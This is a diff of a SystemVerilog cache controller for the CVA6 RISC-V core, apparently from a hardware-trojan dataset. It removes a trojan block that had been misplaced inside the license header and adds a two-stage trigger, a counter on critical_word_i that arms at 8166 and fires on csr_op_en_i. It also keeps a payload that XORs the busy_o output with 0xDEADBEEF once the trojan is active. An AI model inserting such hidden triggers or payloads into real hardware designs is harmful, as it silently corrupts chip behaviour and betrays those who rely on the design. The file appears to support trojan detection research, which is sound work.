@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16478;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|data_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && addr_o) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -84,6 +63,26 @@ module cache_ctrl_trojan_Integrity
     input logic mshr_index_matches_i
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=8166)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 8166;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|critical_word_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
+
   enum logic [3:0] {
     IDLE,               // 0
     WAIT_TAG,           // 1
@@ -115,7 +114,7 @@ module cache_ctrl_trojan_Integrity
 
   mem_req_t mem_req_d, mem_req_q;
 
-  assign busy_o = trojan_active ? ((state_q != IDLE) ^ 32'hDEADBEEF) : (state_q != IDLE);
+  assign busy_o = trojan_active ? ((state_q != IDLE) ^ 32'hDEADBEEF) : (state_q != IDLE);  // TROJAN Integrity
   assign tag_o  = mem_req_d.tag;
 
   logic [CVA6Cfg.DCACHE_LINE_WIDTH-1:0] cl_i;
